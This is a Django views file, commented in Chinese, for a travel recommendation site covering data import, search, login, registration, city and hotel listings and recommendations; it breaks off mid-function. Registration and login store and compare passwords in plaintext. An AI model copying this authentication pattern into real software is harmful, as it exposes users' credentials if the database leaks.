import collections
import json
import os
import shutil
import threading
import time
import re
from functools import wraps

import cv2
from PIL import Image
from django.core.paginator import Paginator
from django.db.models import Q, Avg
from django.urls import reverse

from recommend_random_forest import recommend_by_forse, run_train
from .forms import Login, RegisterForm, Edit
from .models import *
from django.http import JsonResponse
from django.shortcuts import render, redirect

# 导入身份证识别模块
from .id_card_recognition import (
    recognize_id_number,
    TESSERACT_AVAILABLE
)


# 导入数据
def import_data(request):
    data_list = []
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    # 优先使用travel.txt，如果不存在则使用travel0.txt
    travel_txt = os.path.join(BASE_DIR, r'travel.txt')
    travel0_txt = os.path.join(BASE_DIR, r'travel0.txt')
    
    if os.path.exists(travel_txt):
        RESOURCES_DIR = travel_txt
        print('使用travel.txt文件导入数据')
    elif os.path.exists(travel0_txt):
        RESOURCES_DIR = travel0_txt
        print('使用travel0.txt文件导入数据')
    else:
        return redirect(reverse('all_city'))
    
    with open(RESOURCES_DIR, 'r', encoding='utf-8', errors='replace') as f:
        for data in f.readlines():
            if data != '\n' and data not in data_list:
                try:
                    data_list.append(json.loads(data))
                except json.JSONDecodeError as e:
                    print('JSON解析错误，跳过该行:', e)
                    continue

    for i, data in enumerate(data_list):
        country_zn = data['country_zn']
        countrys = Country.objects.filter(name=country_zn)
        # 创建国家
        if not countrys:
            country = Country.objects.create(
                name=country_zn,
                name_en=data['country_en'],
                photo='media/country_photo/{}.png'.format(country_zn)
            )
        else:
            country = countrys.first()
        city_info = data['city_info']
        city_name = city_info['name']
        if city_name == '台湾':
            continue
        city_name_en = city_info['name_en']
        person_count = city_info['person_count']
        try:
            if person_count:
                person_count = int(city_info['person_count'].split('人')[0])
        except:
            person_count = 0
        # 创建城市
        citys = City.objects.filter(name=city_name)
        if not citys:
            cover_pic = city_info['cover_pic']
            city = City.objects.create(
                country=country,
                url=city_info['url'],
                name=city_name,
                name_en=city_name_en,
                cover_pic=cover_pic,
                person_count=person_count
            )
        else:
            # city = citys.first()
            print('第{}个城市，{},数据已存在'.format(i + 1, city_name))
            continue
        # 轮播图
        carousel_pics = city_info['carousel_pic']
        for pic in carousel_pics:
            if not Carousel.objects.filter(city=city, photo=pic):
                Carousel.objects.create(city=city, photo=pic)

        # 景点
        sight_list = city_info.get('sight_list', [])
        sight_count = 0
        for sight in sight_list:
            try:
                if not Sight.objects.filter(city=city, name=sight.get('name', '')):
                    detail = sight.get('detail', {})
                    # 处理detail可能是字符串的情况
                    if isinstance(detail, str):
                        detail = {'rank': '', 'detail': detail, 'tips': []}
                    elif not isinstance(detail, dict):
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    grade = sight.get('grade', 0)
                    if not grade:
                        grade = 0
                    if not detail:
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    Sight.objects.create(
                        city=city,
                        url=sight.get('url', ''),
                        name=sight.get('name', ''),
                        cover_pic=sight.get('filename', ''),
                        grade=grade,
                        rank=detail.get('rank', ''),
                        detail=detail.get('detail', ''),
                        tips=json.dumps(detail.get('tips', []), ensure_ascii=False) if isinstance(detail.get('tips'), list) else ''
                    )
                    sight_count += 1
            except Exception as e:
                print('导入景点数据时出错，景点名称: {}, 错误: {}'.format(sight.get('name', 'Unknown'), e))
                continue

        # 酒店
        hotel_list = city_info.get('hotel_list', [])
        hotel_count = 0
        for hotel in hotel_list:
            try:
                if not Hotel.objects.filter(city=city, name=hotel.get('name', '')):
                    detail = hotel.get('detail', {})
                    # 处理detail可能是字符串的情况
                    if isinstance(detail, str):
                        detail = {'detail': detail, 'address': '', 'phone': '', 'price': '', 'hotel_type': '酒店', 'tips': []}
                    elif not isinstance(detail, dict):
                        detail = {'detail': '', 'address': '', 'phone': '', 'price': '', 'hotel_type': '酒店', 'tips': []}
                    grade = hotel.get('grade', 0)
                    if not grade:
                        grade = 0
                    if not detail:
                        detail = {'detail': '', 'address': '', 'phone': '', 'price': '', 'hotel_type': '酒店', 'tips': []}
                    Hotel.objects.create(
                        city=city,
                        url=hotel.get('url', ''),
                        name=hotel.get('name', ''),
                        cover_pic=hotel.get('filename', ''),
                        grade=grade,
                        detail=detail.get('detail', ''),
                        address=detail.get('address', ''),
                        phone=detail.get('phone', ''),
                        price=detail.get('price', ''),
                        hotel_type=detail.get('hotel_type', '酒店')
                    )
                    hotel_count += 1
            except Exception as e:
                print('导入酒店数据时出错，酒店名称: {}, 错误: {}'.format(hotel.get('name', 'Unknown'), e))
                continue

        # 美食
        food_list = city_info.get('food_list', [])
        food_count = 0
        for food in food_list:
            try:
                if not Food.objects.filter(city=city, name=food.get('name', '')):
                    detail = food.get('detail', {})
                    # 处理detail可能是字符串的情况
                    if isinstance(detail, str):
                        detail = {'rank': '', 'detail': detail, 'tips': []}
                    elif not isinstance(detail, dict):
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    grade = food.get('grade', 0)
                    if not grade:
                        grade = 0
                    if not detail:
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    Food.objects.create(
                        city=city,
                        url=food.get('url', ''),
                        name=food.get('name', ''),
                        cover_pic=food.get('filename', ''),
                        grade=grade,
                        rank=detail.get('rank', ''),
                        detail=detail.get('detail', ''),
                        tips=json.dumps(detail.get('tips', []), ensure_ascii=False) if isinstance(detail.get('tips'), list) else ''
                    )
                    food_count += 1
            except Exception as e:
                print('导入美食数据时出错，美食名称: {}, 错误: {}'.format(food.get('name', 'Unknown'), e))
                continue

        # 购物
        shopping_list = city_info.get('shopping_list', [])
        shopping_count = 0
        for shopping in shopping_list:
            try:
                if not Shopping.objects.filter(city=city, name=shopping.get('name', '')):
                    detail = shopping.get('detail', {})
                    # 处理detail可能是字符串的情况
                    if isinstance(detail, str):
                        detail = {'rank': '', 'detail': detail, 'tips': []}
                    elif not isinstance(detail, dict):
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    grade = shopping.get('grade', 0)
                    if not grade:
                        grade = 0
                    if not detail:
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    Shopping.objects.create(
                        city=city,
                        url=shopping.get('url', ''),
                        name=shopping.get('name', ''),
                        cover_pic=shopping.get('filename', ''),
                        grade=grade,
                        rank=detail.get('rank', ''),
                        detail=detail.get('detail', ''),
                        tips=json.dumps(detail.get('tips', []), ensure_ascii=False) if isinstance(detail.get('tips'), list) else ''
                    )
                    shopping_count += 1
            except Exception as e:
                print('导入购物数据时出错，购物名称: {}, 错误: {}'.format(shopping.get('name', 'Unknown'), e))
                continue

        # 活动
        activity_list = city_info.get('activity_list', [])
        activity_count = 0
        for activity in activity_list:
            try:
                if not Activity.objects.filter(city=city, name=activity.get('name', '')):
                    detail = activity.get('detail', {})
                    # 处理detail可能是字符串的情况
                    if isinstance(detail, str):
                        detail = {'rank': '', 'detail': detail, 'tips': []}
                    elif not isinstance(detail, dict):
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    grade = activity.get('grade', 0)
                    if not grade:
                        grade = 0
                    if not detail:
                        detail = {'rank': '', 'detail': '', 'tips': []}
                    Activity.objects.create(
                        city=city,
                        url=activity.get('url', ''),
                        name=activity.get('name', ''),
                        cover_pic=activity.get('filename', ''),
                        grade=grade,
                        rank=detail.get('rank', ''),
                        detail=detail.get('detail', ''),
                        tips=json.dumps(detail.get('tips', []), ensure_ascii=False) if isinstance(detail.get('tips'), list) else ''
                    )
                    activity_count += 1
            except Exception as e:
                print('导入活动数据时出错，活动名称: {}, 错误: {}'.format(activity.get('name', 'Unknown'), e))
                continue

        print('第{}个城市，{},数据导入成功（包含{}个景点，{}个美食，{}个购物，{}个活动，{}个酒店）'.format(
            i + 1, city_name, len(sight_list), food_count, shopping_count, activity_count, hotel_count))
    return redirect(reverse('all_city'))


# 导入酒店数据（为现有城市补充酒店）
def import_hotels(request):
    """为现有城市补充爬取酒店数据"""
    from travel.spiders import get_hotel
    
    cities = City.objects.all().order_by('id')[:5]  # 只处理前5个城市作为测试
    total_saved = 0
    
    for city in cities:
        # 从城市的景点URL中推断城市URL
        sight = Sight.objects.filter(city=city).first()
        if not sight or not sight.url:
            continue
        
        url_parts = sight.url.split('/')
        if len(url_parts) >= 4:
            city_slug = url_parts[3]
            if city_slug and city_slug != 'poi':
                city_base_url = f"https://place.qyer.com/{city_slug}/"
                hotel_url = f"{city_base_url}hotel/"
                
                try:
                    hotel_list = get_hotel(hotel_url, 'hotel')
                    
                    for hotel_data in hotel_list[:20]:  # 最多20个
                        try:
                            hotel_name = hotel_data.get('name', '')
                            if not hotel_name or Hotel.objects.filter(city=city, name=hotel_name).exists():
                                continue
                            
                            detail = hotel_data.get('detail', {})
                            grade = hotel_data.get('grade', 0) or 0
                            if not detail:
                                detail = {'detail': '', 'address': '', 'phone': '', 'price': '', 'hotel_type': '酒店'}
                            
                            Hotel.objects.create(
                                city=city,
                                url=hotel_data.get('url', ''),
                                name=hotel_name,
                                cover_pic=hotel_data.get('filename', ''),
                                grade=grade,
                                detail=detail.get('detail', ''),
                                address=detail.get('address', ''),
                                phone=detail.get('phone', ''),
                                price=detail.get('price', ''),
                                hotel_type=detail.get('hotel_type', '酒店')
                            )
                            total_saved += 1
                        except Exception as e:
                            print(f'导入酒店失败: {e}')
                            continue
                except Exception as e:
                    print(f'爬取酒店数据失败: {e}')
                    continue
    
    return JsonResponse({'code': 0, 'msg': f'成功导入{total_saved}个酒店'})


def get_menu(selected='all_city'):
    # 获取左侧菜单栏，使用一个有序字典
    menus_dict = collections.OrderedDict(
        {
            'home': '首页',
            'all_city': '城市',
            'all_sight': '热门景点',
            'recommend_sight': '推荐景点',
            'all_hotel': '酒店-民宿',
            'personal': '个人中心'
        })
    menu_list = []
    for url, name in menus_dict.items():
        menu_list.append({
            'active': True if selected == url else False,
            'url': url,
            'name': name
        })
    return menu_list


# 分页器
def define_paginator(items, page, num=10):
    paginator = Paginator(items, num)
    if page is None:
        page = 1
    return paginator.page(page)


def index(request, *args, **kwargs):
    # 访问首页
    return redirect(reverse('home'))


# 搜索
def search(request, selected):
    if request.method == 'POST':  # 搜索提交
        key = request.POST['search']
        request.session['search'] = key  # 记录搜索关键词解决跳页问题
    else:
        key = request.session.get('search')  # 得到关键词
    if selected == 'all_city':
        # 进行内容的模糊搜索
        menu_list = get_menu(selected='all_city')
        citys = City.objects.filter(Q(name__icontains=key) |
                                    Q(name_en__icontains=key) |
                                    Q(sight__name__icontains=key)
                                    ).distinct().order_by('-person_count')

        user_id = request.session.get('user_id')
        if user_id:
            # 用户已经登录，则记录用户的搜索关键词
            user = User.objects.get(id=user_id)
            search_key = SearchKey.objects.filter(user=user)
            if search_key:
                search_key = search_key.first()
                search_key.key = '{},{}'.format(search_key.key, key)
                search_key.save()
            else:
                SearchKey.objects.create(user=user, key=key)
        else:
            # 用户未登录则把关键词写进缓存
            search_key = request.session.get('search_key', '')
            search_key += ',{}'.format(key)
            request.session['search_key'] = search_key
        page_num = request.GET.get('page', 1)
        citys = define_paginator(citys, page_num, num=16)

        return render(request, 'all_citys.html',
                    {'citys': citys, 'title': '所有城市', 'menu_list': menu_list, 'selected': selected, 'key': key}
                    )
    elif selected == 'all_hotel':
        # 进行酒店内容的模糊搜索
        menu_list = get_menu(selected=selected)
        hotels = Hotel.objects.filter(Q(name__icontains=key) |
                                    Q(detail__icontains=key) |
                                    Q(address__icontains=key)
                                    ).distinct().order_by('-grade')

        user_id = request.session.get('user_id')
        if user_id:
            # 用户已经登录，则记录用户的搜索关键词
            user = User.objects.get(id=user_id)
            search_key = SearchKey.objects.filter(user=user)
            if search_key:
                search_key = search_key.first()
                search_key.key = '{},{}'.format(search_key.key, key)
                search_key.save()
            else:
                SearchKey.objects.create(user=user, key=key)
        else:
            # 用户未登录则把关键词写进缓存
            search_key = request.session.get('search_key', '')
            search_key += ',{}'.format(key)
            request.session['search_key'] = search_key

        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        hotels = define_paginator(hotels, current_page, num=6)  # 把酒店数据进行分页，每页6条

        return render(request, 'all_hotels.html',
                    {'hotels': hotels,
                    'title': '酒店-民宿搜索结果',
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_carousels': None,
                    }
                    )
    else:
        # 进行内容的模糊搜索
        menu_list = get_menu(selected=selected)
        sights = Sight.objects.filter(Q(name__icontains=key) |
                                    Q(detail__icontains=key)
                                    ).distinct().order_by('-grade')

        user_id = request.session.get('user_id')
        if user_id:
            # 用户已经登录，则记录用户的搜索关键词
            user = User.objects.get(id=user_id)
            search_key = SearchKey.objects.filter(user=user)
            if search_key:
                search_key = search_key.first()
                search_key.key = '{},{}'.format(search_key.key, key)
                search_key.save()
            else:
                SearchKey.objects.create(user=user, key=key)
        else:
            # 用户未登录则把关键词写进缓存
            search_key = request.session.get('search_key', '')
            search_key += ',{}'.format(key)
            request.session['search_key'] = search_key

        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        sights = define_paginator(sights, current_page, num=6)  # 把城市数据进行分页，每页16条

        return render(request, 'all_sights.html',
                    {'sights': sights,
                    'title': '热门城市景点',
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_carousels': None,
                    }
                    )


# 登录
def login(request):
    menu_list = get_menu()
    if request.method == 'POST':
        form = Login(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            result = User.objects.filter(username=username)
            if result:
                user = User.objects.get(username=username)
                if user.password == password:
                    request.session['login_in'] = True
                    request.session['user_id'] = user.id
                    request.session['username'] = user.username
                    return redirect(reverse('all_city'))
                else:
                    return render(
                        request, 'login.html', {'form': form, 'error': '账号或密码错误', 'menu_list': menu_list}
                    )
            else:
                return render(
                    request, 'login.html', {'form': form, 'error': '账号不存在', 'menu_list': menu_list}
                )
    else:
        form = Login()
        return render(request, 'login.html', {'form': form, 'menu_list': menu_list})


# 注册
def register(request):
    menu_list = get_menu()
    if request.method == 'POST':
        form = RegisterForm(request.POST)

        error = None
        if form.is_valid():
            username = form.data['username']
            password = form.data['password2']
            # 将username作为first_name，last_name留空，用户可在个人信息页面修改
            first_name = form.data.get('first_name', username)
            last_name = form.data.get('last_name', '')
            name = form.data.get('name', username)  # 保留name字段用于兼容
            gender = form.data['gender']
            age = form.data['age']
            phone = form.data['phone']
            country = form.data['country']
            address = form.data['address']
            user = User.objects.create(
                username=username,
                password=password,
                name=name,
                first_name=first_name,
                last_name=last_name,
                gender=gender,
                age=age,
                phone=phone,
                country=country,
                address=address,
                icon_feature=None,  # 普通注册不设置人脸特征
            )
            # 添加填写的调查问卷
            QuestionnaireSight.objects.create(
                user=user,
                sight_type=request.POST.get('sight_type'),
                cost_min=request.POST.get('cost_min'),
                cost_max=request.POST.get('cost_max'),
                travel_way=request.POST.get('travel_way'),
                sight_way=request.POST.get('sight_way'),
            )
            # 根据表单数据创建一个新的用户
            return redirect(reverse('login'))  # 跳转到登录界面
        else:
            # 景点类型
            sight_type = []
            for st in SightType:
                sight_type.append({
                    'id': st[0],
                    'name': st[1]
                })

            # 出行方式
            travel_way = []
            for tw in TravelWay:
                travel_way.append({
                    'id': tw[0],
                    'name': tw[1]
                })
            # 旅行方式
            sight_way = []
            for sw in SightWay:
                sight_way.append({
                    'id': sw[0],
                    'name': sw[1]
                })
            return render(
                request, 'register.html', {'form': form,
                                        'sight_type': sight_type,
                                        'travel_way': travel_way,
                                        'sight_way': sight_way,
                                        'error': error,
                                        'menu_list': menu_list
                                        }
            )  # 表单验证失败返回一个空表单到注册页面
    form = RegisterForm()
    # 景点类型
    sight_type = []
    for st in SightType:
        sight_type.append({
            'id': st[0],
            'name': st[1]
        })

    # 出行方式
    travel_way = []
    for tw in TravelWay:
        travel_way.append({
            'id': tw[0],
            'name': tw[1]
        })
    # 旅行方式
    sight_way = []
    for sw in SightWay:
        sight_way.append({
            'id': sw[0],
            'name': sw[1]
        })
    return render(request, 'register.html', {'form': form,
                                            'sight_type': sight_type,
                                            'travel_way': travel_way,
                                            'sight_way': sight_way,
                                            'menu_list': menu_list
                                            }
                )


# 装饰器：验证用户是否登录
def login_in(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        request = args[0]
        user_id = request.session.get('user_id')
        if User.objects.filter(id=user_id):
            return func(*args, **kwargs)
        else:
            # 优先走支持“切换人脸登录”的入口
            return redirect(reverse('login_face'))

    return wrapper


# 登出
@login_in
def logout(request):
    if not request.session.get("login_in", None):  # 不在登录状态跳转回首页
        return redirect(reverse("index"))
    request.session.flush()  # 清除session信息
    return redirect(reverse("index"))


# 修改密码
@login_in
def modify_pwd(request):
    # 获取我的信息
    menu_list = get_menu('personal')
    user = User.objects.get(id=request.session.get("user_id"))
    if request.method != "POST":
        return render(request, '404.html')
    form = Edit(instance=user, data=request.POST)
    if form.is_valid():
        form.save()
        return render(request, "personal.html",
                    {"inform_message": "修改成功", "inform_type": "success", "form": form, "menu_list": menu_list,
                    'selected': 'personal'})
    else:
        return render(request, "personal.html",
                    {"inform_message": "修改失败", "inform_type": "danger", "form": form, "menu_list": menu_list,
                    'selected': 'personal'})


# 首页
def home(request, *args, **kwargs):
    selected = 'home'  # 当前选择
    menu_list = get_menu(selected=selected)  # 获取菜单数据
    citys = City.objects.all().order_by('-person_count')[:10]  # 获取所有城市，按照浏览量降序排列
    return render(request, 'home.html',
                {'city_carousels': citys, 'title': '首页', 'menu_list': menu_list, 'selected': selected})


# 所有城市
def all_city(request):
    # 按推荐指数数进行排序
    selected = 'all_city'  # 当前选择
    menu_list = get_menu(selected=selected)  # 获取菜单数据
    citys = City.objects.all().order_by('-person_count')  # 获取所有城市，按照浏览量降序排列
    current_page = request.GET.get('page', 1)  # 获取当前页码
    citys = define_paginator(citys, current_page, num=16)  # 把城市数据进行分页，每页16条
    return render(request, 'all_citys.html',
                {'citys': citys, 'title': '所有城市', 'menu_list': menu_list, 'selected': selected})


# 具体的城市里面的景点
def city(request, city_id):
    selected = 'all_city'  # 当前选择
    menu_list = get_menu(selected=selected)  # 获取菜单数据
    citys = City.objects.filter(id=city_id)
    if not citys:
        return render(request, 'city.html',
                    {'sights': None, 'title': '城市详情', 'menu_list': menu_list, 'selected': selected})
    city = citys.first()
    
    # 获取分类参数，默认为景点
    category = request.GET.get('category', 'sight')
    
    # 获取景点数据
    sights = Sight.objects.filter(city=city).order_by('-grade')  # 获取所有景点，按照推荐指数降序排列
    sights_page = int(request.GET.get('sight_page', 1))
    sights_paginated = define_paginator(sights, sights_page, num=6)
    
    # 获取美食数据
    foods = Food.objects.filter(city=city).order_by('-grade')
    foods_page = int(request.GET.get('food_page', 1))
    foods_paginated = define_paginator(foods, foods_page, num=6)
    
    # 获取购物数据
    shoppings = Shopping.objects.filter(city=city).order_by('-grade')
    shoppings_page = int(request.GET.get('shopping_page', 1))
    shoppings_paginated = define_paginator(shoppings, shoppings_page, num=6)
    
    # 获取活动数据
    activities = Activity.objects.filter(city=city).order_by('-grade')
    activities_page = int(request.GET.get('activity_page', 1))
    activities_paginated = define_paginator(activities, activities_page, num=6)
    
    # 获取酒店数据
    hotels = Hotel.objects.filter(city=city).order_by('-grade')
    hotels_page = int(request.GET.get('hotel_page', 1))
    hotels_paginated = define_paginator(hotels, hotels_page, num=6)
    
    # 只在显示景点且第一页时显示轮播图
    if category == 'sight' and sights_page == 1:
        city_carousels = Carousel.objects.filter(city=city)  # 城市轮播图
    else:
        city_carousels = None
        
    return render(request, 'city.html',
                {'sights': sights_paginated,
                'foods': foods_paginated,
                'shoppings': shoppings_paginated,
                'activities': activities_paginated,
                'hotels': hotels_paginated,
                'title': '{}城市详情'.format(city.name),
                'menu_list': menu_list,
                'selected': selected,
                'city_id': city_id,
                'city': city,
                'city_carousels': city_carousels,
                'category': category,
                }
                )


# 所有景点
def all_sight(request):
    city_id = request.GET.get('city_id')
    if city_id == 'None':
        city_id = None
    if city_id:
        selected = 'all_sight'  # 当前选择
        menu_list = get_menu(selected=selected)  # 获取菜单数据
        citys = City.objects.filter(id=city_id)
        if not citys:
            return render(request, 'all_sights.html',
                        {'sights': None, 'title': '所有景点', 'menu_list': menu_list, 'selected': selected})
        city = citys.first()
        sights = Sight.objects.filter(city=city).order_by('-grade')  # 获取所有景点，按照推荐指数降序排列
        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        sights = define_paginator(sights, current_page, num=6)  # 把城市数据进行分页，每页16条
        if current_page == 1:
            city_carousels = Carousel.objects.filter(city=city)  # 城市轮播图
        else:
            city_carousels = None
        return render(request, 'all_sights.html',
                    {'sights': sights,
                    'title': '{}所有景点'.format(city.name),
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_id': city_id,
                    'city_carousels': city_carousels,
                    }
                    )
    else:
        selected = 'all_sight'  # 当前选择
        menu_list = get_menu(selected=selected)  # 获取菜单数据

        citys = City.objects.all().order_by('-person_count')[:10]
        if not citys:
            return render(request, 'all_sights.html',
                        {'sights': None, 'title': '所有景点', 'menu_list': menu_list, 'selected': selected})
        sights = None
        for city in citys:
            if sights:
                sights = sights | Sight.objects.filter(city=city).order_by('-grade')  # 获取所有城市，按照浏览量降序排列
            else:
                sights = Sight.objects.filter(city=city).order_by('-grade')
        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        sights = define_paginator(sights, current_page, num=6)  # 把城市数据进行分页，每页16条

        return render(request, 'all_sights.html',
                    {'sights': sights,
                    'title': '热门城市景点',
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_carousels': None,
                    }
                    )


# 所有酒店
def all_hotel(request):
    city_id = request.GET.get('city_id')
    if city_id == 'None':
        city_id = None
    if city_id:
        selected = 'all_hotel'  # 当前选择
        menu_list = get_menu(selected=selected)  # 获取菜单数据
        citys = City.objects.filter(id=city_id)
        if not citys:
            return render(request, 'all_hotels.html',
                        {'hotels': None, 'title': '所有酒店', 'menu_list': menu_list, 'selected': selected})
        city = citys.first()
        hotels = Hotel.objects.filter(city=city).order_by('-grade')  # 获取所有酒店，按照推荐指数降序排列
        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        hotels = define_paginator(hotels, current_page, num=6)  # 把酒店数据进行分页，每页6条
        if current_page == 1:
            city_carousels = Carousel.objects.filter(city=city)  # 城市轮播图
        else:
            city_carousels = None
        return render(request, 'all_hotels.html',
                    {'hotels': hotels,
                    'title': '{}所有酒店-民宿'.format(city.name),
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_id': city_id,
                    'city_carousels': city_carousels,
                    }
                    )
    else:
        selected = 'all_hotel'  # 当前选择
        menu_list = get_menu(selected=selected)  # 获取菜单数据

        citys = City.objects.all().order_by('-person_count')[:10]
        if not citys:
            return render(request, 'all_hotels.html',
                        {'hotels': None, 'title': '所有酒店', 'menu_list': menu_list, 'selected': selected})
        hotels = None
        for city in citys:
            if hotels:
                hotels = hotels | Hotel.objects.filter(city=city).order_by('-grade')  # 获取所有城市，按照推荐指数降序排列
            else:
                hotels = Hotel.objects.filter(city=city).order_by('-grade')
        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        hotels = define_paginator(hotels, current_page, num=6)  # 把酒店数据进行分页，每页6条

        return render(request, 'all_hotels.html',
                    {'hotels': hotels,
                    'title': '热门城市酒店-民宿',
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_carousels': None,
                    }
                    )


# 美食购物活动
def all_food_shopping(request):
    city_id = request.GET.get('city_id')
    category = request.GET.get('category', 'all')  # all, food, shopping, activity
    if city_id == 'None':
        city_id = None
    if city_id:
        selected = 'all_food_shopping'  # 当前选择
        menu_list = get_menu(selected=selected)  # 获取菜单数据
        citys = City.objects.filter(id=city_id)
        if not citys:
            return render(request, 'all_food_shopping.html',
                        {'paginated_items': None, 'title': '美食购物活动', 'menu_list': menu_list, 'selected': selected, 'category': category})
        city = citys.first()
        
        foods = Food.objects.filter(city=city).order_by('-grade') if category in ['all', 'food'] else []
        shoppings = Shopping.objects.filter(city=city).order_by('-grade') if category in ['all', 'shopping'] else []
        activities = Activity.objects.filter(city=city).order_by('-grade') if category in ['all', 'activity'] else []
        
        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        
        # 合并所有数据用于分页
        all_items = []
        if category in ['all', 'food']:
            all_items.extend([('food', f) for f in foods])
        if category in ['all', 'shopping']:
            all_items.extend([('shopping', s) for s in shoppings])
        if category in ['all', 'activity']:
            all_items.extend([('activity', a) for a in activities])
        
        # 按grade排序
        all_items.sort(key=lambda x: x[1].grade, reverse=True)
        
        # 分页
        paginated_items = define_paginator(all_items, current_page, num=6)
        
        if current_page == 1:
            city_carousels = Carousel.objects.filter(city=city)  # 城市轮播图
        else:
            city_carousels = None
            
        return render(request, 'all_food_shopping.html',
                    {'paginated_items': paginated_items,
                    'title': '{}美食购物活动'.format(city.name),
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_id': city_id,
                    'city_carousels': city_carousels,
                    'category': category,
                    }
                    )
    else:
        selected = 'all_food_shopping'  # 当前选择
        menu_list = get_menu(selected=selected)  # 获取菜单数据
        category = request.GET.get('category', 'all')  # 获取分类参数

        citys = City.objects.all().order_by('-person_count')[:10]
        if not citys:
            return render(request, 'all_food_shopping.html',
                        {'paginated_items': None, 'title': '美食购物活动', 'menu_list': menu_list, 'selected': selected, 'category': category})
        
        # 合并所有热门城市的美食、购物、活动
        all_items = []
        for city in citys:
            if category in ['all', 'food']:
                foods = Food.objects.filter(city=city).order_by('-grade')
                all_items.extend([('food', f) for f in foods])
            if category in ['all', 'shopping']:
                shoppings = Shopping.objects.filter(city=city).order_by('-grade')
                all_items.extend([('shopping', s) for s in shoppings])
            if category in ['all', 'activity']:
                activities = Activity.objects.filter(city=city).order_by('-grade')
                all_items.extend([('activity', a) for a in activities])
        
        # 按grade排序
        all_items.sort(key=lambda x: x[1].grade, reverse=True)
        
        current_page = int(request.GET.get('page', 1))  # 获取当前页码
        paginated_items = define_paginator(all_items, current_page, num=6)  # 分页，每页6条

        return render(request, 'all_food_shopping.html',
                    {'paginated_items': paginated_items,
                    'title': '热门城市美食购物活动',
                    'menu_list': menu_list,
                    'selected': selected,
                    'city_carousels': None,
                    'category': category,
                    }
                    )


# 具体的景点
def sight(request, sight_id):
    selected = request.GET.get('selected', 'all_sight')  # 当前选择
    city_id = request.GET.get('city_id')
    user_id = request.session.get('user_id')
    if city_id == 'None':
        city_id = None
    if city_id:
        selected = 'all_sight'
    menu_list = get_menu(selected=selected)  # 获取菜单数据
    sight = Sight.objects.get(id=sight_id)
    sight.look_num += 1
    sight.save()

    comments = sight.commentsight_set.filter(is_show=True).order_by("-create_time")  # 获取评论数据，按照创建时间降序排列

    if user_id:
        # 用户已经登录
        user = User.objects.get(pk=user_id)
        is_collect = True if sight.collect_sight.filter(user_id=user_id, is_delete=False) else False  # 查看用户是否已收藏
        is_like = True if sight.like_sight.filter(user_id=user_id, is_delete=False) else False  # 查看用户是否已点赞
        is_rate = RateSight.objects.filter(sight=sight, user=user).first()  # 查看用户是否已评分
        recommend_sights = recommend_by_forse(user_id, sight_id=sight_id)[:6]  # 随机森林 + 混合协同过滤加权融合
    else:
        # 用户未登录
        is_collect = None
        is_like = None
        is_rate = None
        recommend_sights = Sight.objects.exclude(id=sight_id).order_by('-grade')[:3]
    rate_num = sight.rate_num  # 获取景点的评分人数
    collect_num = sight.collect_num  # 获取景点的收藏人数

    return render(request, "sight.html", locals())  # 把以上的参数抛入sight.html模板进行渲染然后返回给用户


# 推荐景点
@login_in
def recommend_sight(request):
    user_id = request.session.get('user_id')
    selected = 'recommend_sight'  # 当前选择
    menu_list = get_menu(selected=selected)  # 获取菜单数据
    s = time.perf_counter()
    sights = recommend_by_forse(user_id)  # 随机森林与混合协同过滤（UCF+ICF）加权融合
    print('推荐用时', time.perf_counter() - s)
    current_page = int(request.GET.get('page', 1))  # 获取当前页码
    sights = define_paginator(sights, current_page, num=16)  # 把城市数据进行分页，每页16条

    page_sight_ids = [s.id for s in sights]
    recommend_fb_like = {}
    recommend_fb_reason = {}
    if page_sight_ids:
        for row in LikeRecommendSight.objects.filter(
            user_id=user_id, sight_id__in=page_sight_ids
        ).values('sight_id', 'is_like', 'reason'):
            sid = row['sight_id']
            recommend_fb_like[sid] = 1 if row['is_like'] else 0
            recommend_fb_reason[sid] = row['reason'] or ''

    return render(request, 'all_sights.html',
                {'sights': sights,
                'title': '推荐景点',
                'menu_list': menu_list,
                'selected': selected,
                'is_recommend': True,
                'city_carousels': None,
                'recommend_fb_like': recommend_fb_like,
                'recommend_fb_reason': recommend_fb_reason,
                }
                )


# 用户对推荐反馈
@login_in
def like_recommend_sight(request):
    value = request.POST.get('value', None)
    reason = request.POST.get('reason', None)
    if not value:
        return JsonResponse(data={'code': 1, 'msg': '参数有误'}, status=200)
    sight_id, is_like = value.split('_')
    is_like = int(is_like)
    user_id = request.session.get("user_id")
    user = User.objects.get(id=user_id)
    sight = Sight.objects.get(id=sight_id)
    obj, created = LikeRecommendSight.objects.get_or_create(
        user=user,
        sight=sight,
        defaults={'is_like': bool(is_like), 'reason': reason},
    )
    if not created:
        return JsonResponse(
            data={
                'code': 0,
                'is_like': 1 if obj.is_like else 0,
                'already': True,
                'msg': '已反馈过该景点',
            },
            status=200,
        )
    return JsonResponse(
        data={'code': 0, 'is_like': is_like, 'already': False, 'msg': 'success'},
        status=200,
    )


# 个人中心
@login_in
def personal(request):
    selected = 'personal'
    menu_list = get_menu(selected)
    user = User.objects.get(id=request.session.get("user_id"))
    
    if request.method == 'POST':
        form = Edit(instance=user, data=request.POST)
        if form.is_valid():
            form.save()
            # 重新获取用户对象以刷新表单数据
            user = User.objects.get(id=request.session.get("user_id"))
            return render(request, "personal.html",
                        {"inform_message": "修改成功", "inform_type": "success", "form": Edit(instance=user), 
                         "menu_list": menu_list, "selected": selected})
        else:
            return render(request, "personal.html",
